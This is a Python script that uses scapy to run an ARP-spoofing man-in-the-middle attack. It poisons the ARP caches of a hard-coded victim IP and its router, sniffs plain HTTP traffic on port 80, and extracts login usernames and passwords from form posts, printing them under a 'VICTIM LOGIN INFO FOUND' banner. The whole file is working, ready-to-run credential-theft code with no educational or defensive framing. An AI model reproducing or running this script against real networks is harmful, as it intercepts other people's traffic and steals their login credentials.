from scapy import layers
from scapy.all import *
from scapy.all import send, sniff
from scapy.packet import Raw

flag = True
def process_sniff(packet):
    global flag, prev_packet_str
    if Raw in packet:
        try:
            if flag:
                # flag -= 1

                packet_string = packet[Raw].load.decode("utf-8")
                print(packet_string)

                user_name_pattern = (
                    r'Content-Disposition: form-data; name="id"\r\n\r\n(.*)\r\n'
                )
                password_pattern = (
                    r'Content-Disposition: form-data; name="pw"\r\n\r\n(.*)\r\n'
                )

                user_name = re.search(user_name_pattern, packet_string).group(1)
                password = re.search(password_pattern, packet_string).group(1)

                print(
                    "\n[!] ===================== VICTIM LOGIN INFO FOUND =======================\n"
                )
                print(f"Username: {user_name}")
                print(f"Password: {password}")
                print(
                    "\n==========================================================================\n"
                )
        except Exception as e:
            pass
        flag = flag != True


scapy_obj = layers.l2
victim_ip = "10.123.136.16"
router_ip = "10.123.128.1"

victim_mac = scapy_obj.getmacbyip(victim_ip)
router_mac = scapy_obj.getmacbyip(router_ip)

victim_spoofing = scapy_obj.ARP(
    pdst=victim_ip, hwdst=victim_mac, psrc=router_ip, op="is-at"
)
server_spoofing = scapy_obj.ARP(
    pdst=router_ip, hwdst=router_mac, psrc=victim_ip, op="is-at"
)
victim_restore = scapy_obj.ARP(
    pdst=victim_ip, hwdst=victim_mac, psrc=router_ip, hwsrc=router_mac, op="is-at"
)
server_restore = scapy_obj.ARP(
    pdst=router_ip, hwdst=router_mac, psrc=victim_ip, hwsrc=victim_mac, op="is-at"
)

try:
    while True:
        send(victim_spoofing, verbose=0)
        send(server_spoofing, verbose=0)
        sniff(filter="port 80", timeout=1, prn=process_sniff)
except KeyboardInterrupt:
    send(victim_restore, verbose=0)
    send(server_restore, verbose=0)
